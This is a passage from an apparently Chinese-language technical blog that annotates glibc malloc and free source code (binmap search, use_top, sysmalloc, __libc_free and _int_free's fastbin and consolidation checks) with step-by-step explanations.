class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">   ++idx;</span><br><span class="line">   bin = bin_at (av, idx);</span><br><span class="line">   block = idx2block (idx);</span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">   bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">       <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">do</span></span><br><span class="line">             &#123;</span><br><span class="line">               <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                 <span class="keyword">goto</span> use_top;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">           bit = <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">       <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           assert (bit != <span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">       victim = last (bin);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">       <span class="keyword">if</span> (victim == bin)<span class="comment">//链为空</span></span><br><span class="line">         &#123;</span><br><span class="line">           av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">           size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">           assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* unlink */</span></span><br><span class="line">           unlink (av, victim, bck, fwd);<span class="comment">//unlink</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//多余部分一起分配</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;<span class="comment">//链接进入unsorted</span></span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;<span class="comment">//申请大小在smallbin范围,则将剩余部分置为last_remainer</span></span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//nextsize链</span></span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><ol><li>开头先++idx,因为来到这一步,刚好合适的chunk肯定是没有的,从下一个比当前idx大的找起</li><li>获得下一个bin,对应块,对应map(int对象),获得bit位(这个bit位的返回形式是一个int型数字,32个比特位中对应的那一位是1)</li><li>进入循环<ol><li>若当前map没有足够大的chunk分配(bit&gt;map)或者bit在上一次循环中移出界了(bit==0),向下一个map寻找,两种情况会退出,一是map已是最大直接退出前往use_top,二是下一个map存在足够大的chunk,并将bin调整为当前map的第一个,并执行接下来的流程(即接下来的流程若是执行,则一定能找到合适的分配)</li><li>若当前bit没有对应chunk,bit左移一位,bin向下一个移动,知道找到第一个有对应chunk的链</li><li>取victim为找到的链的最后一个chunk,若其为空与标志位不符,则将bin向下一个移动,bit左移一位,并将当前标志位取消,进入下一次循环</li><li>若不为空,则进行正常的切割流程</li></ol></li></ol><h4 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">//再触发consolidate</span></span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>如果topchunk的size足够分配,那么从topchunk中进行切割</li><li>若不够,如果有fast chunk则进行malloc_consolidate,并再次计算idx,回到大循环起始,<u>一般是申请small chunk进入大循环才有可能会触发这个选项</u></li><li>若不够,且没有fast chunk,采用sysmalloc</li></ol><h4 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><ol><li>检查__free_hook,有则调用</li><li>free(0)直接返回</li><li>如果是mmap分配的,特殊处理</li><li>调用_int_free (ar_ptr, p, 0);</li></ol><h3 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="初始操作"><a href="#初始操作" class="headerlink" title="初始操作"></a>初始操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><ol><li>如果chunk地址非法或者不对齐,报错</li><li>如果size小于minsize或者不对齐,报错</li><li>check_inuse_chunk(av, p);检查</li></ol><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//计算索引</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>malloc时的反操作??</p><h4 id="smallbin-amp-amp-largebin"><a href="#smallbin-amp-amp-largebin" class="headerlink" title="smallbin&amp;&amp;largebin"></a>smallbin&amp;&amp;largebin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> 